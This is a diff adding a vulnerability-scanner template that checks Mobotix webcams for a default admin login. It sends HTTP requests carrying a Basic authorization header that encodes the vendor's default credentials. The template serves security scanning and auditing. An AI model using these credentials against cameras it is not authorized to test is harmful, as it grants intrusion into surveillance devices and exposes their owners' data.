@@ -1,0 +1,39 @@
+id: mobotix-default-credentials
+brief:
+    title: Mobotix - Default Login
+    by: robotshell
+    level: high
+    about: Mobotix contains a default admin login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
+    label:
+        - mobotix
+        - default-login
+        - webcam
+        - iot
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/control/userimage.html'
+      signs:
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: GET
+      to:
+        - '{{BaseURL}}/control/userimage.html'
+      head:
+        Authorization: Basic YWRtaW46bWVpbnNt
+      signs:
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
